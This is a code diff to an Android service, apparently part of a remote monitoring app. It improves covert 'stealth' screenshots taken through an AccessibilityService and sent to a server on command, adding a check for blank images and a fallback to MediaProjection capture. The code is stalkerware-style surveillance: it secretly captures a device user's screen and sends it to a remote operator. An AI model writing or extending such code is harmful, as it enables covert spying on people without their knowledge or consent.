@@ -274,11 +274,12 @@ class MonitoringService : Service() {
         // Step 1: Try 100% stealth screenshot via AccessibilityService first (Android 11+)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && BrowserTracker.instance != null) {
             BrowserTracker.captureStealthBase64(this) { base64 ->
-                if (base64 != null) {
+                if (base64 != null && base64.length > 2500) {
                     wsManager.sendScreenshot(base64, cmdId)
                     Log.i(TAG, "📸 Stealth screenshot sent to server via AccessibilityService")
                 } else {
-                    // Fallback to MediaProjection if stealth capture failed
+                    Log.w(TAG, "Stealth screenshot empty or blank (${base64?.length ?: 0} chars), falling back to MediaProjection")
+                    // Fallback to MediaProjection if stealth capture failed or returned black/blank image
                     captureViaMediaProjection(cmdId)
                 }
             }
